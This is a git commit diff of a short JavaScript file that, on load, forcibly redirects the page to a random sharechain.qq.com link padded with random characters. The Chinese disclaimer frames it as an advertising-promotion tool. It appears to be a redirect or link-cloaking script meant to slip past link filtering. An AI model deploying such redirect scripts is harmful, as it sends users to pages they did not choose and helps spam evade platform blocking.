8901d5ffb8eae14afe6d61a83cf5f2d88232c1b4
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-19 18:36:46 +0800

    Update sjzu.js

--- sjzu.js
+++ sjzu.js
@@ -1,7 +1,7 @@
 // 免责声明：本平台所有接口仅限制用于有偿技术研究讨论与正规广告信息推广使用，请勿用于非法用途，否则产生一切后果由用户自行承担!
 // 禁止一切违法违纪的擦边的网址,图片等 如：(博彩,色情,彩票,不属实内容等违法国家相关法律内容)，否则本平台有权删除相关内容！
 
-var urls=[' http://sharechain.qq.com/6b40e77d6f5fbd46668f1436ea8a1c2b#{nnnnnnn}{wwww}',];
+var urls=[' http://sharechain.qq.com/f9d1403bc58ccca96c372a1f43523cb3#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
